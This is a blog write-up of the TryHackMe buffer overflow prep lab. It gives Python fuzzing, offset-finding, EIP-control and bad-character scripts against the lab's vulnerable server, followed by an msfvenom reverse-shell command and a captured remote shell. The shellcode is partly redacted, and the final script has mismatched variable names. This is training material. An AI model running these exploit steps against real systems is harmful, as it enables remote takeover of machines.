---
title: "Buffer Overflow"
date: 2024-01-26T09:13:36-06:00
draft: false
toc: false
images:
tags:
  - tryhackme
---
[![](/image/20240202235004.png)](https://tryhackme.com/room/bufferoverflowprep)

This room is made by Tib3rius and if you are beginner and you want to learn how buffer overflow works with hand on practice, it will be a good room

Lets begin with this Room

> run program as administrator so you will be able to get admin access without having to go through privilege escalation 

if you don't know the which port program is hosted then use `netstat`
`netstat -ano` `-a is for all ` `-n in number form`  `-o for process id`
![](/image/20240128011817.png)

At line 4 it's running at `port 1337` 

1. if we don't know which part of the program is vulnerable we will use spiking but here we know this is a vulnerable server so we will go with fuzzing instead of spiking
#### connection with server

2. Try to reach the server by Launch it and trying to connect with it using `NETCAT`
```sh
┌──(mike㉿kali)-[~/Tryhackme/walkbuff]
└─$ nc 10.10.166.157 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT
OVERFLOW1 hello
OVERFLOW1 COMPLETE
```
in windows you will see Received a Client connection :-  ![](/image/20240131075843.png)

#### Fuzzing 

3. Fuzzing :- we will try to overload the server using fuzzing 
```python
import socket,time,sys

send = "A" * 100 
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.62.72",1337))
        s.recv(1024)
        string = "OVERFLOW1 " + send
        print ("sending {} byte".format(len(string)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
        print ("Fuzzing crashed at this {} byte".format(len(string)))
        sys.exit(0)
    send = send + "A" * 100
    time.sleep(1)
```

save it with `fuzzer.py` and use `chmod +x fuzzer.py` and run this code using ==python3 fuzzer.py==

```python
──(mike㉿kali)-[~/Tryhackme/buffer]
└─$ python3 fuzzer.py
sending 100 byte
sending 200 byte
sending 300 byte
sending 400 byte
sending 500 byte
sending 600 byte
sending 700 byte
sending 800 byte
sending 900 byte
sending 1000 byte
sending 1100 byte
sending 1200 byte
sending 1300 byte
sending 1400 byte
sending 1500 byte
sending 1600 byte
sending 1700 byte
sending 1800 byte
sending 1900 byte
sending 2000 byte
^Cfuzzing crashed at 2000 byte
```

Now we know our program has `crashed at 2000 Bytes`
we will make a `pattern of 2400 byte` and figure at which point it cash the server 
#### Finding the offset point

```shell
┌──(mike㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 
Aa0Aa1Aa2Aa3Aa4  [[**Redacted**]]    b7Db8Db9
```

```python
import socket,sys,time

payload = "OVERFLOW1 " +  "Aa0Aa1Aa2Aa3Aa4  [[**Redacted**]]    b7Db8Db9"

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.62.72",1337))
    s.recv(1024)
    print("sending handy work")
    s.send(bytes(payload, "latin-1"))
    print("done")
except:
    print("didn't connect")
```

now at this point we will use `MONA Framework` to get the offset point 
![](/image/20240131082134.png)
if we don't have mona we will note down the EIP address and use `Pattern_offset.rb -l 2400 -q <address>`

here i have used -l 2210 just for demonstration(not necessary if you have mona)
 ![](/image/20240129000333.png)

#### Controlling the EIP

```python
import sys,socket,time

payload = "A" * 1978 + "BCDE" <--------------# EIP control value

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.62.72",1337))
    s.recv(1024)
    print ("sending to find offset")
    sendme = "OVERFLOW1 " + payload
    s.send(bytes(sendme, "latin-1"))
    print ("done")
except:
    print("unable to connect")
```

![](/image/20240131082759.png)

#### Finding the bad character to make shellcode (manually)

If we have to find the bad char then it is an iterative process lets dig in

if we are going to use mona for comparison then we will have to create a working directory for it.
`!mona config -set workingfolder c:\mona\%p`

we will make a `bytearray.bin` file for bad char comparison in mona
![](/image/20240131083215.png)

Create a bad char for python :-

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

now modify the code 
```python
import sys,socket,time

payload = "A" * 1978 + "BCDE" 
badchar = "\x01\x02......[[**Redacted**]]......\xfd\xfe\xff"

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.62.72",1337))
    s.recv(1024)
    print ("sending to find offset")
    sendme = "OVERFLOW1 " + payload + badchar
    s.send(bytes(sendme, "latin-1"))
    print ("done")
except:
    print("unable to connect")
```

we will use `mona` to `compare` the `bad char which we have send` and which is present in `bytearray.bin`
![](/image/20240131083706.png)

be remember that only the first one is bad char not the second one 
	REPEAT THIS PROCESS TILL GET UNMODIFIED ![](/image/20240201032100.png)

#### Getting a shell

we have to create a payload for getting a shell for this we will use `msfvenom`

```sh
┌──(mike㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.123.200 LPORT=8888 EXITFUNC=thread -b "\x00[[badchar]]\xba" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=21, char=0x83)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=112, char=0x23)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=17, char=0x83)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1753 bytes
buf =  b""
buf += b"\xfc\xbb\xe2\xf9\x96\x8c\xeb\x0c\x5e\x56\x31\x1e"
    [[**Redacted**]]
buf += b"\xe0\xd3\x14\x8b\x0b"

```

now use modify out code

```python
import socket

buf =  ""
buf += "\xfc\xbb\xe2\xf9\x96\x8c\xeb\x0c\x5e\x56\x31\x1e"
    [[**Redacted**]]
buf += "\xe0\xd3\x14\x8b\x0b"

payload = "OVERFLOW1 " + "A" * 1978 + "\xAF\x11\x50\x62" + "\x90" * 16 + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect((ip, port))
  print("Sending buffer")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("done")
except:
  print("Could not connect.")
```

```sh
┌──(mike㉿kali)-[~]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.17.123.200] from (UNKNOWN) [10.10.62.72] 49286
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0EE5-7CCF

 Directory of C:\Users\admin\Desktop\vulnerable-apps\oscp

07/03/2020  09:38 PM    <DIR>          .
07/03/2020  09:38 PM    <DIR>          ..
07/06/2020  07:29 PM            16,601 essfunc.dll
07/20/2020  09:50 PM            54,648 oscp.exe
               2 File(s)         71,249 bytes
               2 Dir(s)  50,152,583,168 bytes free
```
